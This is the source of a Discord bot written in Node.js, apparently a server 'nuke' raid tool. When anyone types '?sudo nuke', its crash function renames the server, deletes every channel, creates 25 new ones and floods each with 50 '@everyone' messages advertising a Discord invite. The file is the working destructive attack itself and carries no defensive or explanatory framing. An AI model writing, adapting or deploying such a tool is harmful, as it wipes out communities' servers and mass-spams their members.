const { Client, Events, GatewayIntentBits, ChannelType } = require('discord.js');
require("dotenv").config()
const client = new Client({ intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildIntegrations,
    GatewayIntentBits.GuildWebhooks,
    GatewayIntentBits.GuildInvites,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildPresences,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMessageReactions,
    GatewayIntentBits.GuildMessageTyping,
    GatewayIntentBits.DirectMessages,
    GatewayIntentBits.DirectMessageReactions,
    GatewayIntentBits.DirectMessageTyping,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildScheduledEvents,
    GatewayIntentBits.AutoModerationConfiguration,
    GatewayIntentBits.AutoModerationExecution
] });

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}!`);
});




client.on(Events.MessageCreate, async message => {

    //functions

    async function crash(){
        const spamMessage = "@everyone discord.gg/KbXnPBk9Qv"
        const guildName = "guild-rename"
        const channelName = "channel-name"
        const nChannels = 25
        const nMessages = 50

        try {
            await message.guild.setName(guildName)
        } catch (err) {
            console.error('Failed to change guild name:', err);
        }

        const channels = [...message.guild.channels.cache.values()];
        await Promise.all(channels.map(async channel => {
            try {
                await channel.delete();
            } catch (err) {
                console.error(`Failed to delete channel ${channel.name}:`, err);
            }
        }));

        let newChannels = [];
        try {
            const createChannelPromises = [];
            for (let i = 0; i < nChannels; i++) {
                createChannelPromises.push(
                    message.guild.channels.create({
                        name: channelName,
                        type: ChannelType.GuildText
                    }).catch(err => {
                        console.error('Failed: ', err);
                        return null;
                    })
                );
            }
            newChannels = (await Promise.all(createChannelPromises))
                .filter(ch => ch);
        } catch (err) {
            console.error('Error during channel creation:', err);
        }
        const sendPromises = [];
        for (const channel of newChannels) {
            for (let j = 0; j < nMessages; j++) {
                sendPromises.push(channel.send(spamMessage));
            }
        }
    }

    if (message.content == "?sudo nuke") {
        if (!message.guild) return;
        await crash()
    }
    
});

client.login(process.env.token)
